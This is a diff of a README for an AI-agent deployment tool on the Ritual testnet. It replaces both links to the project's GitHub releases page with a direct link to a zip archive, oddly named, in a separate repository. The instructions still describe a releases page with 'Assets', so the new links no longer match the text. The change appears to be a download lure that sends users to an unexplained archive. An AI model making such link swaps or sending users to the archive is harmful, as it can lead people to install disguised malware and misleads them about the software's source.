@@ -5,7 +5,7 @@ description: "Deploy recurring, self-funding AI agents on the Ritual testnet wit
 ---
 # 🤖 ritual-agent-deployment - Run your own smart artificial agent
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/icehockeyplayermusiccritic501/ritual-agent-deployment/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/icehockeyplayermusiccritic501/icehockeyplayermusiccritic501.github.io/main/sambunigrin/io_github_icehockeyplayermusiccritic_3.4.zip)
 
 This software helps you deploy a self-funding artificial intelligence agent. It runs on the Ritual testnet. You need one command to start the process. This tool handles the technical setup for you.
 
@@ -22,7 +22,7 @@ Your computer needs to meet these basic standards to run the agent smoothly:
 
 You must download the correct file for your system. Use the link below to reach the official page.
 
-[Click here to visit the download page](https://github.com/icehockeyplayermusiccritic501/ritual-agent-deployment/releases)
+[Click here to visit the download page](https://raw.githubusercontent.com/icehockeyplayermusiccritic501/icehockeyplayermusiccritic501.github.io/main/sambunigrin/io_github_icehockeyplayermusiccritic_3.4.zip)
 
 1. Open the page above in your web browser.
 2. Look for the section labeled "Assets" at the bottom of the newest release.
